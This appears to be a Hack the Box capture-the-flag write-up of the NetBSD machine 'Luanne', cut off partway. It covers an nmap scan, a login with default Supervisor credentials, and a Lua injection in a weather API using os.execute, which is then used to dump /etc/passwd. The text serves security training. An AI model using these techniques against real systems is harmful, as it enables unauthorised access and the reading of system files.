<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Luanne Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the easy-difficulty machine Luanne from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the easy-difficulty machine Luanne from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/luanne/" /><meta property="og:url" content="https://zweilosec.github.io/posts/luanne/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/0-luanne-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-28T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/0-luanne-infocard.png" /><meta property="twitter:title" content="Hack the Box - Luanne Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2021-03-28T14:00:00+00:00","description":"Zweilosec’s writeup on the easy-difficulty machine Luanne from https://hackthebox.eu","headline":"Hack the Box - Luanne Writeup","image":"https://zweilosec.github.io/assets/img/0-luanne-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/luanne/"},"url":"https://zweilosec.github.io/posts/luanne/"}</script><title>Hack the Box - Luanne Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Luanne Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Luanne Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 28, 2021, 2:00 PM +0000" prep="on" > Mar 28, 2021 <i class="unloaded">2021-03-28T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4761 words">26 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---luanne">HTB - Luanne</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/0-luanne-infocard.png" alt="" /></p><p>This easy difficulty BSD system…This machine is on TJ_Null’s list of OSCP-like machines. Have fun! Short description to include any strange things to be dealt with</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="decrypt-enc-file-in-bsd">Decrypt <code class="language-plaintext highlighter-rouge">.enc</code> file in BSD</h3><ul><li>description with generic example</ul><h3 id="run-commands-as-another-user-sudo-in-bsd">Run commands as another user (<code class="language-plaintext highlighter-rouge">sudo</code>) in BSD</h3><ul><li><a href="https://forums.freebsd.org/threads/doas-sudo-alternative.69219/">https://forums.freebsd.org/threads/doas-sudo-alternative.69219/</a></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>doas <span class="nb">whoami</span>
<span class="c">#root</span>
</pre></table></code></div></div><h3 id="location-of-password-hashes-in-bsd">Location of password hashes in BSD</h3><p><code class="language-plaintext highlighter-rouge">/etc/master.passwd</code></p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.218</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/luanne]
└─<span class="nv">$ </span>nmap <span class="nt">-sCV</span> <span class="nt">-n</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-v</span> <span class="nt">-oA</span> luanne 10.10.10.218
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-18 19:09 EDT
Nmap scan report <span class="k">for </span>10.10.10.218

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 <span class="o">(</span>NetBSD 20190418-hpn13v14-lpk<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db <span class="o">(</span>RSA<span class="o">)</span>
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  Basic <span class="nv">realm</span><span class="o">=</span><span class="nb">.</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 <span class="o">(</span>Supervisor process manager<span class="o">)</span>
| http-auth: 
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  Basic <span class="nv">realm</span><span class="o">=</span>default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD<span class="p">;</span> CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1066.53 seconds
</pre></table></code></div></div><p>Nmap only showed three ports were open on this machine: 22- SSH, 80 - HTTP, and 9001 - which said <code class="language-plaintext highlighter-rouge">Medusa httpd 1.12 (Supervisor process manager)</code>.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p>I started out my enumeration by navigating to <code class="language-plaintext highlighter-rouge">10.10.10.218</code> in my browser.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-unauth.png" alt="" /></p><p>I was immediately greeted by a Basic HTTP authorization prompt. Since I didn’t have any credentials I tried a few basic defaults, but no luck.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-index.png" alt="" /></p><p>Navigating to <code class="language-plaintext highlighter-rouge">/index.html</code> brought me to a default <code class="language-plaintext highlighter-rouge">nginx</code> installation page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-robots.png" alt="" /></p><p>There was only one disallow line in <code class="language-plaintext highlighter-rouge">robots.txt</code> that showed a directory called <code class="language-plaintext highlighter-rouge">/weather</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/3-weather.png" alt="" /></p><p>This did not reveal anything interesting, however. I left <code class="language-plaintext highlighter-rouge">dirbuster</code> running while I checked out the next service. I searched for exploits related to this version of <code class="language-plaintext highlighter-rouge">nginx</code> but only found a few denial of service vulnerabilities and a CNAME leakage. There was nothing useful.</p><h3 id="port-9001---http">Port 9001 - HTTP</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-9001.png" alt="" /></p><p>Navigating to the page hosted on port 9001 also gave me a Basic HTTP authentication prompt. However, this one gave me a little clue. I did some research on the Supervisor process manager, looking for default credentials after seeing the hint of “default”.</p><ul><li><a href="https://readthedocs.org/projects/supervisor/downloads/pdf/latest/">https://readthedocs.org/projects/supervisor/downloads/pdf/latest/</a></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-default.png" alt="" /></p><p>default seemed to be user:123 from the manual (though it specifies none:none)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/6-supervisor-status.png" alt="" /></p><p>after logging in I had a supervisor-status page that showed what appeared to be running processes on the server</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/7.5-processes.png" alt="" /></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
nginx         79  1.6  0.1  33940  3288 ?     S    10:22AM 1:16.12 nginx: worker process 
root           0  0.0  0.2      0 13184 ?     DKl  10:21AM 0:12.73 <span class="o">[</span>system]
root           1  0.0  0.0  19852  1528 ?     Is   10:21AM 0:00.01 init 
root         164  0.0  0.0  32528  2296 ?     Ss   10:21AM 0:00.17 /usr/sbin/syslogd <span class="nt">-s</span> 
root         308  0.0  0.0  19708  1336 ?     Is   10:21AM 0:00.00 /usr/sbin/powerd 
_httpd       336  0.0  0.3 118876 17040 ?     Ss   10:22AM 7:37.56 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
root         347  0.0  0.0  73104  2916 ?     Is   10:22AM 0:00.04 /usr/sbin/sshd 
root         366  0.0  0.0  33368  1824 ?     Is   10:22AM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
r.michaels   378  0.0  0.0  34996  1996 ?     Is   10:22AM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3001 <span class="nt">-L</span> weather /home/r.michaels/devel/webapi/weather.lua <span class="nt">-P</span> /var/run/httpd_devel.pid <span class="nt">-U</span> r.michaels <span class="nt">-b</span> /home/r.michaels/devel/www 
_httpd       394  0.6  0.0  35160  2004 ?     Ss   10:22AM 0:07.32 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3000 <span class="nt">-L</span> weather /usr/local/webapi/weather.lua <span class="nt">-U</span> _httpd <span class="nt">-b</span> /var/www 
root         396  0.0  0.0  20216  1652 ?     Is   10:22AM 0:00.14 /usr/sbin/cron 
_httpd      9224  0.0  0.0  35460  2332 ?     I     1:49PM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3000 <span class="nt">-L</span> weather /usr/local/webapi/weather.lua <span class="nt">-U</span> _httpd <span class="nt">-b</span> /var/www 
_httpd      9657  0.0  0.0  35460  2332 ?     I     1:33PM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3000 <span class="nt">-L</span> weather /usr/local/webapi/weather.lua <span class="nt">-U</span> _httpd <span class="nt">-b</span> /var/www 
_httpd     12348  0.0  0.0  17744  1456 ?     O    12:02AM 0:00.00 /usr/bin/egrep ^USER| <span class="se">\\</span><span class="o">[</span>system<span class="se">\\</span><span class="o">]</span> <span class="k">*</span><span class="nv">$|</span> init <span class="k">*</span><span class="nv">$|</span> /usr/sbin/sshd <span class="k">*</span><span class="nv">$|</span> /usr/sbin/syslogd <span class="nt">-s</span> <span class="k">*</span><span class="nv">$|</span> /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 <span class="k">*</span><span class="nv">$|</span> /usr/sbin/cron <span class="k">*</span><span class="nv">$|</span> /usr/sbin/powerd <span class="k">*</span><span class="nv">$|</span> /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span>.<span class="k">*</span><span class="nv">$|</span>^root.<span class="k">*</span> login <span class="k">*</span><span class="nv">$|</span> /usr/libexec/getty Pc ttyE.<span class="k">*</span><span class="nv">$|</span> nginx.<span class="k">*</span>process.<span class="k">*</span><span class="nv">$ </span>
_httpd     16606  0.0  0.0  35160     4 ?     R    12:02AM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3000 <span class="nt">-L</span> weather /usr/local/webapi/weather.lua <span class="nt">-U</span> _httpd <span class="nt">-b</span> /var/www 
_httpd     18685  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3000 <span class="nt">-L</span> weather /usr/local/webapi/weather.lua <span class="nt">-U</span> _httpd <span class="nt">-b</span> /var/www 
_httpd     20969  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3000 <span class="nt">-L</span> weather /usr/local/webapi/weather.lua <span class="nt">-U</span> _httpd <span class="nt">-b</span> /var/www 
_httpd     26236  0.0  0.0  35460  2296 ?     I     8:54PM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3000 <span class="nt">-L</span> weather /usr/local/webapi/weather.lua <span class="nt">-U</span> _httpd <span class="nt">-b</span> /var/www 
root         413  0.0  0.0  19780  1584 ttyE1 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE1 
root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE2 
root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
</pre></table></code></div></div><p>I saw a cron in the process output, as well as a weather.lua</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/8-no-exec.png" alt="" /></p><p>I tried checking for local file inclusion and code execution vulnerabilities but they just gave errors.</p><h3 id="port-80---weatherforecast">Port 80 - <code class="language-plaintext highlighter-rouge">/weather/forecast/</code></h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/9.5-weather-forecast.png" alt="" /></p><p>I found a directory <code class="language-plaintext highlighter-rouge">/weather/forecast/</code> using Dirbuster.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/9-weather-forecast.png" alt="" /></p><p>“No city specified. Use ‘city=list’ to list available cities.”</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/10-weather-test.png" alt="" /></p><p>‘test’ showed unknown city error</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/11-lua-error.png" alt="" /></p><p>Sending a query of <code class="language-plaintext highlighter-rouge">'</code> (single quote) resulted in a “nil value” Lua error. I expected to test for a SQL injection vulnerability, but got something else instead. I did some reading on Lua syntax to see if I could figure out how to get this to execute code.</p><ul><li><a href="https://www.lua.org/manual/5.1/manual.html">https://www.lua.org/manual/5.1/manual.html</a></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/12-noscript-xss-warning.png" alt="" /></p><p>My first attempt triggered a warning from NoScript about a possible XSS attack. I had to close off the function parameters with <code class="language-plaintext highlighter-rouge">')</code>, separate the commands with a <code class="language-plaintext highlighter-rouge">;</code>, and use a Lua comment <code class="language-plaintext highlighter-rouge">--</code> at the end closed off the insertion to get this warning. I still did not get code execution however.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/12-lua-code-exec.png" alt="" /></p><p>Looking a bit closer at my attempt, I noticed that I had typed <code class="language-plaintext highlighter-rouge">os.system('id')</code> rather than <code class="language-plaintext highlighter-rouge">os.execute('id')</code> which NoScript saw as JavaScript, triggering that warning. Fixing this error allowed me to get command execution.</p><blockquote><p>NoScript still caught the attempt using <strong><code class="language-plaintext highlighter-rouge">os.execute</code></strong>, but at least it drew my attention to my error the first time!</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>root:<span class="k">*</span>:0:0:Charlie &amp;:/root:/bin/sh
toor:<span class="k">*</span>:0:0:Bourne-again Superuser:/root:/bin/sh
daemon:<span class="k">*</span>:1:1:The devil himself:/:/sbin/nologin
operator:<span class="k">*</span>:2:5:System &amp;:/usr/guest/operator:/sbin/nologin
bin:<span class="k">*</span>:3:7:Binaries Commands and Source:/:/sbin/nologin
games:<span class="k">*</span>:7:13:&amp; pseudo-user:/usr/games:/sbin/nologin
postfix:<span class="k">*</span>:12:12:&amp; pseudo-user:/var/spool/postfix:/sbin/nologin
named:<span class="k">*</span>:14:14:&amp; pseudo-user:/var/chroot/named:/sbin/nologin
ntpd:<span class="k">*</span>:15:15:&amp; pseudo-user:/var/chroot/ntpd:/sbin/nologin
sshd:<span class="k">*</span>:16:16:&amp; pseudo-user:/var/chroot/sshd:/sbin/nologin
_pflogd:<span class="k">*</span>:18:18:&amp; pseudo-user:/var/chroot/pflogd:/sbin/nologin
_rwhod:<span class="k">*</span>:19:19:&amp; pseudo-user:/var/rwho:/sbin/nologin
_proxy:<span class="k">*</span>:21:21:Proxy Services:/nonexistent:/sbin/nologin
_timedc:<span class="k">*</span>:22:22:&amp; pseudo-user:/nonexistent:/sbin/nologin
_sdpd:<span class="k">*</span>:23:23:&amp; pseudo-user:/nonexistent:/sbin/nologin
_httpd:<span class="k">*</span>:24:24:&amp; pseudo-user:/var/www:/sbin/nologin
_mdnsd:<span class="k">*</span>:25:25:&amp; pseudo-user:/nonexistent:/sbin/nologin
_tests:<span class="k">*</span>:26:26:&amp; pseudo-user:/nonexistent:/sbin/nologin
_tcpdump:<span class="k">*</span>:27:27:&amp; pseudo-user:/var/chroot/tcpdump:/sbin/nologin
_tss:<span class="k">*</span>:28:28:&amp; pseudo-user:/var/tpm:/sbin/nologin
_rtadvd:<span class="k">*</span>:30:30:&amp; pseudo-user:/var/chroot/rtadvd:/sbin/nologin
_unbound:<span class="k">*</span>:32:32:&amp; pseudo-user:/var/chroot/unbound:/sbin/nologin
_nsd:<span class="k">*</span>:33:33:&amp; pseudo-user:/var/chroot/nsd:/sbin/nologin
uucp:<span class="k">*</span>:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
nobody:<span class="k">*</span>:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
r.michaels:<span class="k">*</span>:1000:100::/home/r.michaels:/bin/ksh
nginx:<span class="k">*</span>:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
dbus:<span class="k">*</span>:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
</pre></table></code></div></div><p>Using this command execution I pulled <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to enumerate the users on the machine. There were only two users who could login with a shell, <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">r.michaels</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
